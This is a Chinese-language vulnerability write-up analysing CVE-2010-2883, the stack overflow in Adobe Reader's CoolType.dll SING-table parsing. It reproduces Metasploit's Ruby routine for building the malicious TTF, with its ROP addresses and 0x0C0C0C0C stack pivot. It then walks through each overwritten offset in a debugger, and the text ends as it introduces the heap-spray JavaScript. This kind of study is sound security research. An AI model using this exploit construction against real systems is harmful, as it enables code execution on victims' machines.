
# [原创]CVE-2010-2883分析_更新：如何自己构造poc文件

*相关文件可以在《漏洞战争》这本书的配套资料中获取*

# 1. 漏洞描述与思考

该漏洞是Adobe Reader和Acrobat中的`CoolType.dll`库在解析字体文件`SING`表中的`uniqueName`项时存在的栈溢出漏洞。

之前漏洞分析一直参考的0day这本书，这次开始看《漏洞战争》，（只针对这一个漏洞）发现里面对于一些细节并没有特别说明，导致我在分析的时候还是满头雾水，虽然按照书中的介绍也能够分析出来，但还是觉得各个步骤之间的逻辑关系不够明确。

现在已知存在漏洞的文件，同时书中配套资料也提供了poc的PDF文件。我首先想知道的是文件字体`SING`表究竟是什么东西，以及`CoolType.dll`文件中具体哪里存在漏洞这两个问题。

## 1.1 SING表是什么？

我直接做了一张思维导图，包含了`TTF`文件和`SING`表的结构组成：

![图片描述](upload/attach/202107/600394_T7845E4SJQVUV4Y.png)

`TTF`文件的结构十分简单，它是由一系列的表组成的，开头是一个`Font Directory`，记录了整个文件以及各个表的信息。每个表都有一个四字节的标签，`SING`就是一个标签。要注意的是，每个`Table Directory`的顺序和后面的各个表的顺序并不是一一对应的，要根据`Table Directory`中的`offset`值找到对应表的位置。

每个表都包含了关于字体的不同信息，`SING`(`Smart INdependent Glyphlets`)表中包含的是和生僻字有关的信息。

## 1.2. 定位漏洞位置

在`IDA`中打开`CoolType.dll`这个文件，搜索`SING`字符串，查看其交叉引用，

![图片描述](upload/attach/202107/600394_ZNUQTGG9EXZCHK6.png)

在第二项中，可以看到在引用`SING`字符串下面的不远处，有一个`strcat`函数调用，所以大概率应该就是这里存在漏洞了，位于函数`0x803DCF9`中。

看一下漏洞所在函数的代码：

![图片描述](upload/attach/202107/600394_TYV8SMG2F5KV9GP.png)

上面的代码已经做了部分处理和注释，这里用到一个技巧，就是按`Shift+F1`，打开`Local Types`窗口，再按`Insert`，插入`C`语言写的结构体`SING`，然后修改变量类型为`SING`，这样比较方便分析。

![图片描述](upload/attach/202107/600394_WBMPUYCFMF4YTQG.png)

从上面这段代码判断可以得出一些简单的结论，`TTF`文件中不存在`name`表，`sing`表的`tableVersionMajor`等于`0`或者`0x100`。这种情况下会到达漏洞处。

其实前面还有一些判断条件我没有确定是什么意思，但目前只能分析到这个程度，虽然再花时间也能分析出来，但是会花费太长时间，所以我选择继续分析其他内容。

# 3. POC分析

## 3.1 TTF文件

### 3.1.1 文件结构

`TTF`文件的提取可以使用`PDFStreamDumper`，

![图片描述](upload/attach/202107/600394_T73KZQTB78D8S4J.png)

可以看到其中的`SING`字符串，如果查看`Stream Details`也能够看到这是一个`ttf`类型。然后右键选择`Save Decompressed Stream`，在`010editor`中打开这个文件，可以直观的看到`TTF`的结构：

![图片描述](upload/attach/202107/600394_USFAQ9T7S43F42M.png)

### 3.1.2 msf exploit中的make_ttf

紧接着上面看到的`TTF`文件，看一下`msf`是怎么构建这个文件的：

```ruby
def make_ttf
ttf_data = ""
# load the static ttf file
# NOTE: The 0day used Vera.ttf (785d2fd45984c6548763ae6702d83e20)
path = File.join( Msf::Config.install_root, "data", "exploits", "cve-2010-2883.ttf" )
fd = File.open( path, "rb" )
ttf_data = fd.read(fd.stat.size)
fd.close
# Build the SING table
sing = ''
sing << [
0, 1, # tableVersionMajor, tableVersionMinor (0.1)
0xe01, # glyphletVersion
0x100, # embeddingInfo
0, # mainGID
0, # unitsPerEm
0, # vertAdvance
0x3a00 # vertOrigin
].pack('vvvvvvvv')
# uniqueName
# "The uniqueName string must be a string of at most 27 7-bit ASCII characters"
#sing << "A" * (0x254 - sing.length)
sing << rand_text(0x254 - sing.length)
# 0xffffffff gets written here @ 0x7001400 (in BIB.dll)
sing[0x140, 4] = [0x4a8a08e2 - 0x1c].pack('V')
# This becomes our new EIP (puts esp to stack buffer)
ret = 0x4a80cb38 # add ebp, 0x794 / leave / ret
sing[0x208, 4] = [ret].pack('V')
# This becomes the new eip after the first return
ret = 0x4a82a714
sing[0x18, 4] = [ret].pack('V')
# This becomes the new esp after the first return
esp = 0x0c0c0c0c
sing[0x1c, 4] = [esp].pack('V')
# Without the following, sub_801ba57 returns 0.
sing[0x24c, 4] = [0x6c].pack('V')
ttf_data[0xec, 4] = "SING"
ttf_data[0x11c, sing.length] = sing
ttf_data
end
```

`msf`使用的基础`TTF`文件是`Vera.ttf (785d2fd45984c6548763ae6702d83e20)`，然后对这个文件内容进行修改。

然后开始构造`SING`表，前十六个字节如下，可以看到`tableVersionMajor`设成了`0`：

```ruby
sing << [
0, 1, # tableVersionMajor, tableVersionMinor (0.1)
0xe01, # glyphletVersion
0x100, # embeddingInfo
0, # mainGID
0, # unitsPerEm
0, # vertAdvance
0x3a00 # vertOrigin
].pack('vvvvvvvv')
```

`uniqueName`字段先是被初始化成了随机字符`sing << rand_text(0x254 - sing.length)`，然后再设置几个特殊位置用于作为跳转地址，这部分内容先不考虑，等之后开始调试再分析。

最后设置了`ttf`文件的`0xec`和`0x11c`的位置，我们可以看一下原始的`Vera.ttf`文件，这两个位置上是什么内容：

![图片描述](upload/attach/202107/600394_UY2PKKE5CVDQ56H.png)

从上图可以看出来，代码其实是将原本的`name`表的`tag`修改成了`sing`，同时用`sing`表的内容替换了位于`0x11C`的原本`name`表的内容。这也与静态分析的结论相符合——`TTF`文件中不存在`name`表。

## 3.2 调试分析

### 3.2.1 三个特殊位置顺利分析出来

在上面有看到`TTF`文件中设置了几个特殊的位置，分别是：

```ruby
# 0xffffffff gets written here @ 0x7001400 (in BIB.dll)
sing[0x140, 4] = [0x4a8a08e2 - 0x1c].pack('V')
# This becomes our new EIP (puts esp to stack buffer)
ret = 0x4a80cb38 # add ebp, 0x794 / leave / ret
sing[0x208, 4] = [ret].pack('V')
# This becomes the new eip after the first return
ret = 0x4a82a714
sing[0x18, 4] = [ret].pack('V')
# This becomes the new esp after the first return
esp = 0x0c0c0c0c
sing[0x1c, 4] = [esp].pack('V')
# Without the following, sub_801ba57 returns 0.
sing[0x24c, 4] = [0x6c].pack('V')
```

下面通过调试确定这几个位置的作用。

找到了漏洞的位置之后，使用之前在0day上学习到的调试`PDF`漏洞的方法，使用`OD`打开`Adobe Reader`，选择`File`→`Open`，在打开`POC`之前，在`0x803DCF9`这里设置一个断点，然后打开`POC`文件，`OD`会断在断点位置，在这里打一个快照方便之后回溯。

然后执行到`0x0803DDAB`的`strcat`调用处，`F8`执行，可以看到`0x12E4D8`已经被写入了`sing`表的`uniquename`内容：

![图片描述](upload/attach/202107/600394_XEYYTXKHKMKJKDF.png)

接下来要确定程序的执行流程是在哪里被劫持的，直接在复制的这段数据上设置内存访问断点（这个方法很好，一开始我还想靠代码分析，后来发现完全不行，太复杂了），`F9`执行。

接下来会经历两次对该段数据的遍历，这里不用管，已知到达了一个调用：

![图片描述](upload/attach/202107/600394_ACCMTMQ976HQW88.png)

注意到这里调用的地址就保存在`uniquename`中，也就是上面提到的第二个特殊位置：

```ruby
# This becomes our new EIP (puts esp to stack buffer)
ret = 0x4a80cb38 # add ebp, 0x794 / leave / ret
sing[0x208, 4] = [ret].pack('V')
```

进入该调用，此时寄存器的情况：

![图片描述](upload/attach/202107/600394_DUH38VG74CY6YDU.png)

`add ebp, 0x794 / leave`这两句指令会更新`ebp`和`esp`寄存器，`leave`指令相当于`mov esp, ebp / pop ebp`，相当于：

```c
ebp = ebp + 0x794; // 0x12e4dc，注意这个地址是uniquename中的第五个字节所在位置
esp = ebp;
ebp = [0x12e4dc]; // 0xe78b53ab
esp = esp + 4; // 0x12e4e0
```

所以最后执行完`retn`指令，相当于把`uniquename`中的第9~12个字节作为了下一个跳转地址，也就是上面提到的第三个特殊位置：

```ruby
# This becomes the new eip after the first return
ret = 0x4a82a714
sing[0x18, 4] = [ret].pack('V') # 注意这个偏移0x18是从sing表的开头计算
```

`uniquename`中的第13~16字节是`0x0C0C0C0C`，也就是上面提到的第四个特殊位置：

```ruby
# This becomes the new esp after the first return
esp = 0x0c0c0c0c
sing[0x1c, 4] = [esp].pack('V')
```

而`0x4a82a714`处的指令为`pop esp / retn`，所以从这一步之后，栈顶就到了`payload`所在的位置了

![图片描述](upload/attach/202107/600394_Z2JK9BRTMN7Y5A3.png)

到目前位置已经确定了三个特殊位置字节的作用，但是还有第一个和第五个特殊位置不知道有什么用（当然注释里面其实已经说了(lll￢ω￢)）

### 3.2.2 确定了另一个特殊位置

为了测试这两个位置字节的作用，在执行`strcat`之前，手工修改要复制的内容（后来通过修改`msf`的脚本直接在`kali`里面生成`TTF`文件，下面写了）：

![图片描述](upload/attach/202107/600394_WUTBUEHM73MVM2X.png)

其中绿框圈中的是已知的特殊位置，蓝框圈中的是未知特殊位置。

然后还是设置内存访问断点，`F9`开始调试，跳过前两遍遍历之后，到达了下面这个位置：

![图片描述](upload/attach/202107/600394_DJT4V5A9WS5SNXS.png)

这个时候如果继续`F9`，程序会直接退出，所以这里`F7`进入下面那个`call`指令，会到达下面的位置：

![图片描述](upload/attach/202107/600394_WH7B5BVSPJNAZYV.png)

注意这里赋给`ECX`寄存器`0x12E45C`处存储的值，也就是我们关注的第一个特殊位置，继续`F8`，到达这里：

![图片描述](upload/attach/202107/600394_VRGBZYJDVQGTZSZ.png)

总结下来：

```cpp
ecx = [0x12e45c];
eax = ecx + 0x1c;
--eax;
```

所以`0x12e45c`这里一定要存储一个可写的地址，这也是代码中有一个`- 0x1c`的原因。

```ruby
# 0xffffffff gets written here @ 0x7001400 (in BIB.dll)
sing[0x140, 4] = [0x4a8a08e2 - 0x1c].pack('V')
```

看一下内存空间：

![图片描述](upload/attach/202107/600394_3QK8JZ9TDP6AS2Q.png)

手动把`EAX`的值改成`0x4a8a08e2`，让程序可以继续执行。

结果继续`F9`，程序成功到达了`payload`的位置。嗯？？？那第五个特殊位置的值到底有什么用？

### 3.2.3 剩下最后一个特殊位置

其实一开始我也想到要执行执行`ruby`的脚本获取测试用`TTF`文件，但是嫌弃它有点麻烦，就先采取了手工修改内存的方式，结果还是出了问题……

因为我没有仔细注意`uniquename`的长度问题，可以对比一下是否添加`sing[0x24c, 4] = [0x6c].pack('V')`这句代码，得到的`TTF`文件的差别：

![图片描述](upload/attach/202107/600394_ZV7S73FB9S4M4XX.png)

所以一定要设置一个`\x00`的结尾字符，否则`strcat`无法判断字符串结尾，会一直向后复制

***注：这里我想到了`CVE-2009-0927`这个漏洞，是否可以复制超长字符串引发异常，然后覆盖异常处理函数的方法，但是后来发现不行，因为第一个异常处理函数并没有被覆盖到。***

然后现在的问题就在于是否一定要设置`6C`这个字符（根据上面的实验结果应该是不需要的），以及是否一定要设置在`0x24c`这个位置上。

因为之前已经确定了几个特殊位置，我决定把上面的那句代码修改为`sing[0x20c, 4] = [0x00].pack('V')`，经过测试仍然可以到达`payload`位置执行。

所以第五个特殊位置只是为了保证字符串有一个`\x00`的结尾（因为实验次数不多，而且没有看代码，这个结论不敢保证100%正确）：

```ruby
# Without the following, sub_801ba57 returns 0.
sing[0x24c, 4] = [0x6c].pack('V')
```

# 4. 关于payload的一些思考

## 4.1 javascript代码与堆内存的构成

### 4.1.1 0x0C0C0C0C的秘密

我并没有想再完整的分析完`payload`的内容，但是在调试的过程中，确实存在一些问题想要弄清楚。

目前还没有看`poc`中`javascript`的代码是什么样子的，不过知道采用的仍旧是堆喷射的手法。在之前学习堆喷射的时候，了解到的是`javascipt`在堆中分配一大块内存，把`shellcode`放在里面，其余内存设置为`\x90`，然后在溢出时覆盖跳转地址为`0x0C0C0C0C`，这个地址一定在堆分配的地址中，这样经过了一段`nop`指令之后，一定会命中`shellcode`。

可是在调试这个漏洞的时候，发现程序在到达`0x0C0C0C0C`之后，需要的数据刚好位于`0x0C0C0C0C`的位置，所以这里的`javascript`的代码肯定和我一开始想的不太一样

![图片描述](upload/attach/202107/600394_9Q9N4XEAZZDM62X.png)

从`PDF`中提取出来的`javascript`代码如下：
